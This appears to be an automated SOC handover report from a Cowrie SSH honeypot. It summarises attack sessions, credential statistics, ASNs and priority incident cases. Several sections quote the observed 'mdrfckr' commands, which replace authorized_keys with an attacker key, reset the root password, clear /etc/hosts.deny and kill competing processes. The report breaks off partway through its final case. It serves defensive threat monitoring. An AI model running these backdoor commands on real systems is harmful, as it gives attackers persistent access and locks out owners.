# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T22:30:35Z |
| **Shift Time** | 22:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **57** |
| Confirmed Threats | **48** |
| False Positives Filtered | **9** (15.8%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **14** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **46** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **27** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **14** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 2 |
| `guest` | 2 |
| `centos` | 2 |
| `Blank` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `P@ssw0rd` | 2 |
| `8888888888` | 2 |
| `root2003` | 2 |
| `dietpi` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `P@ssw0rd` | 2 |
| `root` | `8888888888` | 2 |
| `root` | `root2003` | 2 |
| `Blank` | `dietpi` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qa2ws#ed` | `8.140.20.23` | 2026-03-27T20:45:55 |
| `root` | `3245gs5662d34` | `8.140.20.23` | 2026-03-27T20:45:58 |
| `root` | `10221022` | `218.90.138.78` | 2026-03-27T20:46:23 |
| `root` | `P@ssw0rd` | `210.4.68.73` | 2026-03-27T21:01:37 |
| `root` | `P@ssw0rd` | `190.56.162.181` | 2026-03-27T21:01:50 |
| `root` | `8888888888` | `182.79.218.164` | 2026-03-27T21:12:09 |
| `root` | `8888888888` | `98.102.148.242` | 2026-03-27T21:12:17 |
| `root` | `root2003` | `197.242.170.10` | 2026-03-27T21:21:36 |
| `root` | `root2003` | `117.242.191.29` | 2026-03-27T21:21:43 |
| `root` | `x1x2x3` | `101.126.24.58` | 2026-03-27T21:28:55 |
| `root` | `butthole` | `180.184.178.165` | 2026-03-27T22:15:20 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:jM6TjskuLpQx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.184.178.165`, `218.90.138.78`, `101.126.24.58`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `8.140.20.23`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **26** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS10796` | Charter Communications Inc | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f4dc4be4d092

| Field | Detail |
|---|---|
| **Source IP** | `8.140.20[.]23` |
| **First Seen** | 2026-03-27 20:45 |
| **Last Seen** | 2026-03-27 20:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 20:45:54` | `cowrie.session.connect` |
| `2026-03-27 20:45:54` | `cowrie.client.version` |
| `2026-03-27 20:45:54` | `cowrie.client.kex` |
| `2026-03-27 20:45:55` | `cowrie.login.success` |
| `2026-03-27 20:45:55` | `cowrie.session.params` |
| `2026-03-27 20:45:55` | `cowrie.command.input` |
| `2026-03-27 20:45:55` | `cowrie.command.failed` |
| `2026-03-27 20:45:55` | `cowrie.log.closed` |
| `2026-03-27 20:45:55` | `cowrie.session.params` |
| `2026-03-27 20:45:55` | `cowrie.command.input` |
| `2026-03-27 20:45:56` | `cowrie.session.file_download` |
| `2026-03-27 20:45:56` | `cowrie.log.closed` |
| `2026-03-27 20:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.140.20[.]23` to AbuseIPDB if not already reported
- [ ] Block `8.140.20[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e406b9840218

| Field | Detail |
|---|---|
| **Source IP** | `8.140.20[.]23` |
| **First Seen** | 2026-03-27 20:45 |
| **Last Seen** | 2026-03-27 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 20:45:58` | `cowrie.session.connect` |
| `2026-03-27 20:45:58` | `cowrie.client.version` |
| `2026-03-27 20:45:58` | `cowrie.client.kex` |
| `2026-03-27 20:45:58` | `cowrie.login.success` |
| `2026-03-27 20:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.140.20[.]23` to AbuseIPDB if not already reported
- [ ] Block `8.140.20[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-188a5e40c946

| Field | Detail |
|---|---|
| **Source IP** | `218.90.138[.]78` |
| **First Seen** | 2026-03-27 20:46 |
| **Last Seen** | 2026-03-27 20:46 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jM6TjskuLpQx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 20:46:23` | `cowrie.session.connect` |
| `2026-03-27 20:46:23` | `cowrie.client.version` |
| `2026-03-27 20:46:23` | `cowrie.client.kex` |
| `2026-03-27 20:46:23` | `cowrie.login.success` |
| `2026-03-27 20:46:24` | `cowrie.session.params` |
| `2026-03-27 20:46:24` | `cowrie.command.input` |
| `2026-03-27 20:46:24` | `cowrie.command.failed` |
| `2026-03-27 20:46:24` | `cowrie.log.closed` |
| `2026-03-27 20:46:24` | `cowrie.session.params` |
| `2026-03-27 20:46:24` | `cowrie.command.input` |
| `2026-03-27 20:46:24` | `cowrie.session.file_download` |
| `2026-03-27 20:46:24` | `cowrie.log.closed` |
| `2026-03-27 20:46:35` | `cowrie.session.params` |
| `2026-03-27 20:46:35` | `cowrie.command.input` |
| `2026-03-27 20:46:35` | `cowrie.log.closed` |
| `2026-03-27 20:46:35` | `cowrie.session.params` |
| `2026-03-27 20:46:35` | `cowrie.command.input` |
| `2026-03-27 20:46:35` | `cowrie.log.closed` |
| `2026-03-27 20:46:36` | `cowrie.session.params` |
| `2026-03-27 20:46:36` | `cowrie.command.input` |
| `2026-03-27 20:46:36` | `cowrie.session.file_download` |
| `2026-03-27 20:46:36` | `cowrie.log.closed` |
| `2026-03-27 20:46:36` | `cowrie.session.params` |
| `2026-03-27 20:46:36` | `cowrie.command.input` |
| `2026-03-27 20:46:36` | `cowrie.log.closed` |
| `2026-03-27 20:46:36` | `cowrie.session.params` |
| `2026-03-27 20:46:36` | `cowrie.command.input` |
| `2026-03-27 20:46:37` | `cowrie.log.closed` |
| `2026-03-27 20:46:37` | `cowrie.session.params` |
| `2026-03-27 20:46:37` | `cowrie.command.input` |
| `2026-03-27 20:46:37` | `cowrie.command.input` |
| `2026-03-27 20:46:37` | `cowrie.log.closed` |
| `2026-03-27 20:46:37` | `cowrie.session.params` |
| `2026-03-27 20:46:37` | `cowrie.command.input` |
| `2026-03-27 20:46:38` | `cowrie.log.closed` |
| `2026-03-27 20:46:38` | `cowrie.session.params` |
| `2026-03-27 20:46:38` | `cowrie.command.input` |
| `2026-03-27 20:46:38` | `cowrie.log.closed` |
| `2026-03-27 20:46:38` | `cowrie.session.params` |
| `2026-03-27 20:46:38` | `cowrie.command.input` |
| `2026-03-27 20:46:38` | `cowrie.log.closed` |
| `2026-03-27 20:46:39` | `cowrie.session.params` |
| `2026-03-27 20:46:39` | `cowrie.command.input` |
| `2026-03-27 20:46:39` | `cowrie.log.closed` |
| `2026-03-27 20:46:39` | `cowrie.session.params` |
| `2026-03-27 20:46:39` | `cowrie.command.input` |
| `2026-03-27 20:46:39` | `cowrie.log.closed` |
| `2026-03-27 20:46:40` | `cowrie.session.params` |
| `2026-03-27 20:46:40` | `cowrie.command.input` |
| `2026-03-27 20:46:40` | `cowrie.log.closed` |
| `2026-03-27 20:46:40` | `cowrie.session.params` |
| `2026-03-27 20:46:40` | `cowrie.command.input` |
| `2026-03-27 20:46:40` | `cowrie.log.closed` |
| `2026-03-27 20:46:41` | `cowrie.session.params` |
| `2026-03-27 20:46:41` | `cowrie.command.input` |
| `2026-03-27 20:46:41` | `cowrie.log.closed` |
| `2026-03-27 20:46:41` | `cowrie.session.params` |
| `2026-03-27 20:46:41` | `cowrie.command.input` |
| `2026-03-27 20:46:41` | `cowrie.log.closed` |
| `2026-03-27 20:46:41` | `cowrie.session.params` |
| `2026-03-27 20:46:41` | `cowrie.command.input` |
| `2026-03-27 20:46:42` | `cowrie.log.closed` |
| `2026-03-27 20:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.90.138[.]78` to AbuseIPDB if not already reported
- [ ] Block `218.90.138[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6630299c19e

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-03-27 21:01 |
| **Last Seen** | 2026-03-27 21:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:01:35` | `cowrie.session.connect` |
| `2026-03-27 21:01:35` | `cowrie.client.version` |
| `2026-03-27 21:01:35` | `cowrie.client.kex` |
| `2026-03-27 21:01:37` | `cowrie.login.success` |
| `2026-03-27 21:01:38` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1abb4d713a7

| Field | Detail |
|---|---|
| **Source IP** | `190.56.162[.]181` |
| **First Seen** | 2026-03-27 21:01 |
| **Last Seen** | 2026-03-27 21:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:01:47` | `cowrie.session.connect` |
| `2026-03-27 21:01:48` | `cowrie.client.version` |
| `2026-03-27 21:01:48` | `cowrie.client.kex` |
| `2026-03-27 21:01:50` | `cowrie.login.success` |
| `2026-03-27 21:01:51` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.56.162[.]181` to AbuseIPDB if not already reported
- [ ] Block `190.56.162[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cf29267a51

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-03-27 21:12 |
| **Last Seen** | 2026-03-27 21:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:12:08` | `cowrie.session.connect` |
| `2026-03-27 21:12:09` | `cowrie.client.version` |
| `2026-03-27 21:12:09` | `cowrie.client.kex` |
| `2026-03-27 21:12:09` | `cowrie.login.success` |
| `2026-03-27 21:12:10` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1771adae3b5c

| Field | Detail |
|---|---|
| **Source IP** | `98.102.148[.]242` |
| **First Seen** | 2026-03-27 21:12 |
| **Last Seen** | 2026-03-27 21:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:12:15` | `cowrie.session.connect` |
| `2026-03-27 21:12:15` | `cowrie.client.version` |
| `2026-03-27 21:12:15` | `cowrie.client.kex` |
| `2026-03-27 21:12:17` | `cowrie.login.success` |
| `2026-03-27 21:12:17` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.102.148[.]242` to AbuseIPDB if not already reported
- [ ] Block `98.102.148[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddea97bde9a8

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-03-27 21:21 |
| **Last Seen** | 2026-03-27 21:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:21:32` | `cowrie.session.connect` |
| `2026-03-27 21:21:32` | `cowrie.client.version` |
| `2026-03-27 21:21:32` | `cowrie.client.kex` |
| `2026-03-27 21:21:36` | `cowrie.login.success` |
| `2026-03-27 21:21:36` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed9329cd785

| Field | Detail |
|---|---|
| **Source IP** | `117.242.191[.]29` |
| **First Seen** | 2026-03-27 21:21 |
| **Last Seen** | 2026-03-27 21:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:21:41` | `cowrie.session.connect` |
| `2026-03-27 21:21:42` | `cowrie.client.version` |
| `2026-03-27 21:21:42` | `cowrie.client.kex` |
| `2026-03-27 21:21:43` | `cowrie.login.success` |
| `2026-03-27 21:21:43` | `cowrie.direct-tcpip.request` |
| `2026-03-27 21:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.242.191[.]29` to AbuseIPDB if not already reported
- [ ] Block `117.242.191[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703b64d8d625

| Field | Detail |
|---|---|
| **Source IP** | `101.126.24[.]58` |
| **First Seen** | 2026-03-27 21:28 |
| **Last Seen** | 2026-03-27 21:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1PE6PerEbr5X"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 21:28:54` | `cowrie.session.connect` |
| `2026-03-27 21:28:54` | `cowrie.client.version` |
| `2026-03-27 21:28:54` | `cowrie.client.kex` |
| `2026-03-27 21:28:55` | `cowrie.login.success` |
| `2026-03-27 21:28:56` | `cowrie.session.params` |
| `2026-03-27 21:28:56` | `cowrie.command.input` |
| `2026-03-27 21:28:56` | `cowrie.command.failed` |
| `2026-03-27 21:28:56` | `cowrie.log.closed` |
| `2026-03-27 21:28:57` | `cowrie.session.params` |
| `2026-03-27 21:28:57` | `cowrie.command.input` |
| `2026-03-27 21:28:57` | `cowrie.session.file_download` |
| `2026-03-27 21:28:57` | `cowrie.log.closed` |
| `2026-03-27 21:29:14` | `cowrie.session.params` |
| `2026-03-27 21:29:14` | `cowrie.command.input` |
| `2026-03-27 21:29:14` | `cowrie.log.closed` |
| `2026-03-27 21:29:15` | `cowrie.session.params` |
| `2026-03-27 21:29:15` | `cowrie.command.input` |
| `2026-03-27 21:29:16` | `cowrie.log.closed` |
| `2026-03-27 21:29:16` | `cowrie.session.params` |
| `2026-03-27 21:29:16` | `cowrie.command.input` |
| `2026-03-27 21:29:16` | `cowrie.session.file_download` |
| `2026-03-27 21:29:16` | `cowrie.log.closed` |
| `2026-03-27 21:29:17` | `cowrie.session.params` |
| `2026-03-27 21:29:17` | `cowrie.command.input` |
| `2026-03-27 21:29:17` | `cowrie.log.closed` |
| `2026-03-27 21:29:18` | `cowrie.session.params` |
| `2026-03-27 21:29:18` | `cowrie.command.input` |
| `2026-03-27 21:29:18` | `cowrie.log.closed` |
| `2026-03-27 21:29:19` | `cowrie.session.params` |
| `2026-03-27 21:29:19` | `cowrie.command.input` |
| `2026-03-27 21:29:19` | `cowrie.command.input` |
| `2026-03-27 21:29:20` | `cowrie.log.closed` |
| `2026-03-27 21:29:20` | `cowrie.session.params` |
| `2026-03-27 21:29:20` | `cowrie.command.input` |
| `2026-03-27 21:29:21` | `cowrie.log.closed` |
| `2026-03-27 21:29:21` | `cowrie.session.params` |
| `2026-03-27 21:29:21` | `cowrie.command.input` |
| `2026-03-27 21:29:21` | `cowrie.log.closed` |
| `2026-03-27 21:29:22` | `cowrie.session.params` |
| `2026-03-27 21:29:22` | `cowrie.command.input` |
| `2026-03-27 21:29:22` | `cowrie.log.closed` |
| `2026-03-27 21:29:23` | `cowrie.session.params` |
| `2026-03-27 21:29:23` | `cowrie.command.input` |
| `2026-03-27 21:29:23` | `cowrie.log.closed` |
| `2026-03-27 21:29:24` | `cowrie.session.params` |
| `2026-03-27 21:29:24` | `cowrie.command.input` |
| `2026-03-27 21:29:24` | `cowrie.log.closed` |
| `2026-03-27 21:29:25` | `cowrie.session.params` |
| `2026-03-27 21:29:25` | `cowrie.command.input` |
| `2026-03-27 21:29:25` | `cowrie.log.closed` |
| `2026-03-27 21:29:25` | `cowrie.session.params` |
| `2026-03-27 21:29:25` | `cowrie.command.input` |
| `2026-03-27 21:29:26` | `cowrie.log.closed` |
| `2026-03-27 21:29:26` | `cowrie.session.params` |
| `2026-03-27 21:29:26` | `cowrie.command.input` |
| `2026-03-27 21:29:26` | `cowrie.log.closed` |
| `2026-03-27 21:29:27` | `cowrie.session.params` |
| `2026-03-27 21:29:27` | `cowrie.command.input` |
| `2026-03-27 21:29:27` | `cowrie.log.closed` |
| `2026-03-27 21:29:28` | `cowrie.session.params` |
| `2026-03-27 21:29:28` | `cowrie.command.input` |
| `2026-03-27 21:29:28` | `cowrie.log.closed` |
| `2026-03-27 21:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.24[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.126.24[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7365e7dfe7

| Field | Detail |
|---|---|
| **Source IP** | `180.184.178[.]165` |
| **First Seen** | 2026-03-27 22:15 |
| **Last Seen** | 2026-03-27 22:15 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
